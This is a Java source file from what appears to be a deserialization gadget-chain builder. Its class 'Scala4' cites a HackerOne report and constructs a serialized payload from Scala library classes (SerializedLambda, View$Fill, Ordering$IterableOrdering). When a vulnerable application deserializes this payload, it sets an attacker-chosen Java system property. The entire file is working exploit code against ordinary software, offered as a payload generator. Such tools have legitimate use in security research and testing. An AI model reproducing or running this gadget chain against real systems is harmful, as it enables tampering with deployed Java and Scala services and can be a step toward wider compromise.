package org.ses.gadgetbuilder.chains1;

import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.GadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.doubleparam.CompareTrampoline;
import org.ses.gadgetbuilder.util.Reflections;
import scala.Tuple2;

import java.io.*;
import java.lang.invoke.MethodHandleInfo;
import java.lang.invoke.SerializedLambda;
import java.lang.reflect.Constructor;


/**
 * https://hackerone.com/reports/1529790
 */
@Dependencies({"org.scala-lang:scala-library:2.13.6"})
@Authors(Authors.JARIJ)
@Impact(Impact.SetProperty)
public class Scala4 extends GadgetChain<CompareTrampoline> {
    public Scala4(CompareTrampoline _trampoline) {
        super(_trampoline);
    }

    private static Object createFuncFromSerializedLambda(SerializedLambda serialized) throws IOException, ClassNotFoundException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(serialized);

        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));
        return ois.readObject();
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {

        String key = command.split(":")[0];
        String value = command.split(":")[1];

        Tuple2 prop = new scala.Tuple2<>(key, value);

        // Should be: 142951686315914362
        long versionUID = ObjectStreamClass.lookup(scala.Tuple2.class).getSerialVersionUID();
        System.out.println("VersionUID: " + versionUID);

        SerializedLambda lambdaSetSystemProperty = new SerializedLambda(scala.sys.SystemProperties.class,
                "scala/Function0", "apply", "()Ljava/lang/Object;",
                MethodHandleInfo.REF_invokeStatic, "scala.sys.SystemProperties",
                "$anonfun$addOne$1", "(Lscala/Tuple2;)Ljava/lang/String;",
                "()Lscala/sys/SystemProperties;", new Object[]{prop});

        Class<?> clazz = Class.forName("scala.collection.View$Fill");
        Constructor<?> ctor = clazz.getConstructor(int.class, scala.Function0.class);
        Object view = ctor.newInstance(1, createFuncFromSerializedLambda(lambdaSetSystemProperty));

        clazz = Class.forName("scala.math.Ordering$IterableOrdering");

        Object iterableOrdering = Reflections.createWithoutConstructor(clazz);

        return new TrampolineConnector(iterableOrdering, view, view);
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }


    @Override
    protected String getStackTrace() {
        return "scala.math.Ordering$IterableOrdering.compare()\n"+
                "scala.math.Ordering$IterableOrdering.compare()\n"+
                "scala.collection.Iterator$$anon$22.next()\n"+
                "scala.sys.SystemProperties$$Lambda$130.apply()\n"+
                "scala.sys.SystemProperties.$anonfun$addOne$1()\n"+
                "System.setProperty()";
    }
}
